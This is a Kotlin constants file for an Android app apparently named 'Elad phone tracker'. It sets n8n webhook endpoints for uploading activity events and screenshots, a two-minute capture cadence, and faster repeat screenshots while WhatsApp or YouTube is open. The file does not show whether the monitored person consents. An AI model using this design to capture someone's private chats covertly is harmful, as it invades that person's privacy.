package com.aautomations.eladtracker

// Central configuration constants for Elad phone tracker.
// All URLs, intervals, and app-specific settings live here.

object Constants {
    const val N8N_BASE = "https://n8n2.aautomations.business"
    const val UPLOAD_URL = "$N8N_BASE/webhook/phone-upload"
    const val SCREENSHOT_URL = "$N8N_BASE/webhook/phone-screenshot"
    const val POLL_URL = "$N8N_BASE/webhook/phone-poll"

    // How often to batch-upload events and poll for settings
    const val BATCH_INTERVAL_MS = 120_000L // 2 minutes

    // Screenshot cadence for regular apps
    const val SCREENSHOT_INTERVAL_MS = 120_000L // 2 min default

    // For WhatsApp/YouTube: take a follow-up shot 30s after app opens
    const val SCREENSHOT_SPECIAL_DELAY_MS = 30_000L // 30s second shot

    // Then continue at 60s intervals while the special app stays foregrounded
    const val SCREENSHOT_SPECIAL_INTERVAL_MS = 60_000L // 1 min for special apps

    // Apps that get higher-frequency screenshots
    val SPECIAL_APPS = setOf("com.whatsapp", "com.google.android.youtube")

    const val PREFS_NAME = "tracker_prefs"
    const val PREF_SCREENSHOTS_ENABLED = "screenshots_enabled"
}
